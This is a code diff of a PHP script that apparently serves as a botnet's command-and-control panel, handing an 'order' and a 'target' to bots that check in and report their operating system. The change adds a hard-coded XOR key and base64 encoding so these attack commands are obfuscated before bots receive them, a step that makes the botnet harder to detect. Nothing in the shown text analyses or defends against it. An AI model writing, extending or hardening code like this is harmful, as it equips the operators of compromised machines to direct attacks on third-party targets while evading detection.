@@ -20,6 +20,18 @@
 ########################################################################
 */
 
+function xor_commands($string) {
+	$key = ('gT8jUdw65h');
+	$text =$string;
+	$outText = '';
+	for($i=0;$i<strlen($text);) {
+		for($j=0;($j<strlen($key) && $i<strlen($text));$j++,$i++) {
+         		$outText .= $text{$i} ^ $key{$j};
+     		}
+	}
+	return $outText;
+}
+
 $configFile = "data/config";
 $passFile = "data/password";
 
@@ -42,7 +54,10 @@ $curPw = explode("\n", $pwContent);
 $curPw = $curPw[0];
 
 if($_GET['p'] == "bot") {
-	print $order."\n".$target;
+	// encrypt commands
+	$unencryptedCommands = $order."\n".$target;
+	$encryptedCommands = xor_commands($unencryptedCommands);
+	print base64_encode($encryptedCommands);
 
 	// filter html stuff
 	$botOs = strip_tags($_GET['os']);
